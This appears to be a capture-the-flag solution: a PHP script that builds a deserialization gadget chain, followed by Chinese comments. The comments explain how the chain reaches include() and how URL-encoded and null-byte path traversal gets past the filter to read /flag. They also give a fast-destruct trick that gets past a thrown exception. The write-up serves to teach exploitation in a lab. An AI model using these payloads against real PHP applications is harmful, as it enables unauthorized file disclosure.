<?php
highlight_file(__FILE__);

class night
{
    public $night;

    public function __destruct(){
        echo $this->night . '哒咩哟';
    }
}

class day
{
    public $day;

    public function __toString(){
        echo $this->day->go();
    }

    public function __call($a, $b){
        echo $this->day->getFlag();
    }
}


class light
{
    public $light;

    public function __invoke(){
        echo $this->light->d();
    }
}

class dark
{
    public $dark;

    public function go(){
        ($this->dark)();
    }

    public function getFlag(){
        include(hacked($this->dark));
    }
}

function hacked($s) {
    if(substr($s, 0,1) == '/'){
        die('呆jio步');
    }
    $s = preg_replace('/\.\.*/', '.', $s);
    $s = urldecode($s);
    $s = htmlentities($s, ENT_QUOTES, 'UTF-8');
    return strip_tags($s);
}
$night=new night();
$day1=new day();
$night->night=$day1;
$dark1=new dark();
$day1->day=$dark1;
$light=new light();
$dark1->dark=$light;
$day2=new day();
$light->light=$day2;
$dark2=new dark();
$day2->day=$dark2;
$dark2->dark="%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fflag";
print_r(serialize([$night,1]));
print_r("\n");
print_r(urlencode('⁦快给我传参⁩⁦pop')); //


//  
 unserialize() 会去调用 night 类的 __destruct() 方法，
 由于方法中的 echo $this->night . '哒咩哟'; 把这个对象当成了字符串，
 所以调用了 day 类的 __toString() 方法，
 然后再调用 dark 类里的 go() 方法，
 然后在 go() 方法里把这个对象当成了方法使用，
 所以就去调用了 light 类的 __invoke 方法，
 又因为在 __invoke 方法里再次调用了一个不存在的 d() 方法，
 接着就会去调用 day 类里的 __call 方法，最后去调用 dark 类里的 getFlag() 方法。
 然后我们发现最终 include() 的时候调用了一个过滤函数 hacked()，
 不允许 /，和 ../ 开头，
 我们一般知道 flag 的位置一般是 /flag ，我们尝试使用 %00 进行绕过过滤。
 .%00%00./%00.%00%00./%00.%00%00./flag
 或者url编码绕过
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fflag

 最后序列化出的字符串要去掉最后的}号，以达到绕过throw new Exception('seino')
 原理是： 通过fast destruct 提前触发魔术方法，从而绕过 throw 语句
 
    